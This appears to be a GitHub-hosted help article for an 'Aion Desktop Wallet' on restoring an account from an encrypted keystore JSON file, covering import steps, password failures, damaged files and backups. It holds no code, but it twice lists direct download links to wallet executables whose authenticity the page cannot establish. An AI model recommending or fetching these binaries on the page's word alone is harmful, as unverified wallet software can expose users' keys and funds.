![Aion Wallet](assets/banner-article.png)

# Aion keystore file restore, step by step

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Restoring from a keystore file takes one file and one password: select the file in the current release, enter the password that was set when it was created, and the account it belongs to reopens with its balance intact.

The file is not a wallet in the sense the seed phrase is. It is one encrypted private key, and everything about the restore follows from that: it brings back a single account, it cannot be opened without its password, and it does not care which machine you use as long as the bytes are unchanged.

## You'll see this if

- You have a file ending in `.json`, or a text file whose contents start with a JSON object, from an earlier Aion wallet.
- You exported a backup before reinstalling and now need the account back.
- You are moving a wallet to a new computer without wanting to type the seed phrase there.
- The login screen offers an import option and you are not sure whether your file is the right kind.

## What the file actually contains

A keystore stores an encrypted private key alongside the parameters needed to decrypt it: the cipher, the key derivation function, an iteration count and a salt. The password you chose is what turns that structure back into a usable key.

Nothing in the file identifies the wallet beyond its address, and nothing in it is readable without the password. That is also why the file can be copied safely and why copying it does not create a second wallet: both copies open the same account.

## The restore, step by step

1. Install the current release from the release page rather than an older build you happen to still have.
2. Keep the original file where it is. Work from a copy so a failed import never damages the only backup.
3. Open the wallet and choose the import or restore option, then select the file.
4. Enter the password exactly as it was set. Watch the keyboard layout: a password typed on a different layout fails without telling you why.
5. If the wallet offers a choice between importing an account and replacing the wallet, choose import; replacing can overwrite the local wallet you already have.
6. Confirm the address that appears against the address you expect, comparing the first and last characters.
7. Set a new password for the local wallet once the account is open, and record it somewhere you will find it again.

Allow the client a moment to reach a node before deciding that the balance is wrong. An imported account with no connection shows the same empty screen as an imported account with no funds.

## When the password is rejected

The failure is decryption, not authentication. There is no lockout to wait out and no reset to request, and the message tells you nothing about how close the password was.

Try the variations a person actually uses: an old password reused from another service, the same phrase with a different capitalisation, a trailing space from a paste. Do not run a brute-force tool against a file that holds real funds unless you are certain of what it does and where it writes.

If none of the candidates work, the account is recoverable only from the seed phrase, and the [Aion wallet forgot password](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-forgot-password.md) article sets out that path.

## If the import fails before the password

A file that is not accepted at all is usually damaged rather than encrypted. Re-save it from the original export, check that it has not been converted by an editor that changed the line endings, and confirm the extension was not renamed by a download.

An empty or truncated file cannot be repaired by hand. If the only copy is damaged and no seed phrase exists, the account is out of reach.

## Prevention

Export a keystore file for every account, not just the first one, and keep each file with a note of the password it uses. The note should not be stored next to the file.

Test the backup once, on a clean machine or after a reinstall, while the funds are small. A backup that has never been opened is a hope rather than a backup.

Keep the seed phrase as well. The keystore protects one account and depends on a password; the phrase protects the wallet and depends on nothing else. The [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) guide explains when each one is the better route.

## Keystore or seed phrase: which to reach for

The phrase restores the wallet; the file restores one account. A holder with both should use the phrase first, because a wallet with several accounts comes back in one step rather than one import at a time.

A holder with only the file is not stuck, provided the password survives. That is the case the [Aion wallet forgot password](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-forgot-password.md) article covers from the other direction, and the [Aion desktop wallet migration](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-desktop-wallet-migration.md) guide shows the same import used to leave an older build.

## Frequently asked questions

### Is it safe to move a keystore file by email?

The file is encrypted, so a copy in transit is not immediately usable. It is still a bad habit: the password may travel in the same conversation, and mail archives outlive the reason you sent it. Use a local copy or an encrypted archive.

### Can I open the same keystore on two computers?

Yes, and both copies control the same account. Anything that compromises either machine compromises the funds.

### Does importing a keystore replace my existing wallet?

Importing an account should add it. If a prompt offers to replace the wallet, decline and use the import option instead.

### Why does the password fail on a new computer?

A different keyboard layout is the usual cause. Type it in a text field you can inspect first, then paste it into the wallet.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion wallet forgot password](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-forgot-password.md) - what to do when the keystore password is gone.
- [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) - the three ways into an existing wallet.
- [Aion wallet zero balance after login](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-zero-balance.md) - when an imported account looks empty.
- [Aion desktop wallet migration](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-desktop-wallet-migration.md) - moving coins out of an older client.
